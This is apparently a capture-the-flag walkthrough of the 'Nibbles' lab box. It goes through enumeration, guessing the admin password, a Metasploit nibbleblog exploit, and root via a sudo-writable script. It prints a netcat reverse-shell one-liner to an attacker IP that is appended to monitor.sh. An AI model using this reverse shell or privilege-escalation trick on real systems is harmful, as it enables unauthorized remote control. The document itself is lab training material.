So to start out for Nibbles, you run a simple nmap scan to find ports 22 and 80 open. You navigate to the webpage and find nothing of interest, but looking at the source code gives you the path to the blog for the website. Navigating to this also doesn't have much, but you can run some directory enumeration to find useful information. We find a path to `config.xml` and `admin.php`, which could be interesting. Looking at `config.xml`, we find that there is a user named **admin** for the website.

While this sounds like we could just brute force the password, you in fact cannot — this blog blacklists you after a certain number of tries and doesn't work no matter what brute force tool I tried (and trust me, I tried). Instead, how everyone else solved this was with intuition. If you look at `config.xml` again, you'll find the word "nibbles" in the file a lot, and the name of the box is Nibbles. Trying `nibbles` shows that it is in fact the password.

At this point, you can now use a Metasploit exploit, as it needed the username and password to run. Just search up `nibbleblog` on Metasploit and use the first one. Drop a shell:

```bash
shell
/bin/bash -i
```

Navigate to the nibbler user's directory to get the `user.txt` flag.

Now when we run `sudo -l`, we see that we have sudo permissions on the `monitor.sh` script. Unzip `personal.zip` and `cd` to the `stuff` directory. There are probably multiple ways to solve the box from here — all you need to do is append some privilege escalation script to the file, but I couldn't figure it out on my own. The script everyone else appended to `monitor.sh` was:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.14.3 1234 >/tmp/f' | tee -a monitor.sh
```

Or some variation of that. Set a nc listener on port 1234 and do `./monitor.sh` to get your root privileges. Get to the root directory and get the flag.
